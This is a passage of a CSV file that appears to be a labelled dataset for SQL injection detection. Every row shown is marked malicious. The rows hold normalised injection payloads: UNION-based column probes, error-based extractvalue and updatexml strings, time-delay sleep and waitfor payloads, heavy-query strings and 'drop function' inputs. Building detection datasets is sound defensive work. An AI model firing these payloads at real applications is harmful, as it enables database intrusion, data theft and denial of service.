row_index,payload_norm,label,sqli_type_hint
9990,"-4669' union all select 9387,9387,9387,9387,9387,9387,9387,9387,9387,9387--",1,
9991,"1"" where 3221 = 3221 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",1,
9992,-7466 where 5161 = 5161 or 3038 = 3038,1,
9993,"1%"" ) ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( ""%"" = """,1,
9994,"-4477' ) ) union all select 8444,8444,8444,8444,8444,8444,8444,8444--",1,
9995,"1%' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and '%' = '",1,
9996,1' and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ),1,
9997,"1"" or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",1,
9998,"-4035' union all select 9540,9540,9540,9540,9540,9540,9540,9540,9540,9540--",1,
9999,"-8999"" where 2821 = 2821 union all select 2821,2821,2821,2821,2821,2821,2821,2821#",1,
10000,"1 ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( 3039 = 3039",1,
10001,"1"" ) ) ) rlike sleep ( 5 ) #",1,
10002,"1' in boolean mode ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) #",1,
10003,"1"" where 8672 = 8672 union all select null,null#",1,
10004,if ( 4907 = 9581 ) select 4907 else drop function apqw--,1,
10005,"1' where 9222 = 9222 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
10006,1 ) as itvm where 1482 = 1482,1,
10007,-6912' in boolean mode ) union all select 6012--,1,
10008,"-6334' ) union all select 3738,3738,3738,3738,3738,3738,3738,3738--",1,
10009,"1'+ ( select pepf where 5071 = 5071 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
10010,"1"" ) as lipa where 3450 = 3450 and make_set ( 8403 = 8403,8899 ) --",1,
10011,"1' ) where 6081 = 6081 union all select null,null,null,null,null,null,null,null,null--",1,
10012,waitfor delay '0:0:5' and ( ( 'uvlf' = 'uvlf,1,
10013,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""%"" = """,1,
10014,"1"" ) where 2367 = 2367",1,
10015,-6616 ) order by 1--,1,
10016,"1"" ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""kzcd"" = ""kzcd",1,
10017,-4137 ) ) as elxu where 5672 = 5672 order by 1--,1,
10018,if ( 8812 = 7896 ) select 8812 else drop function xltk--,1,
10019,-3559' ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ),1,
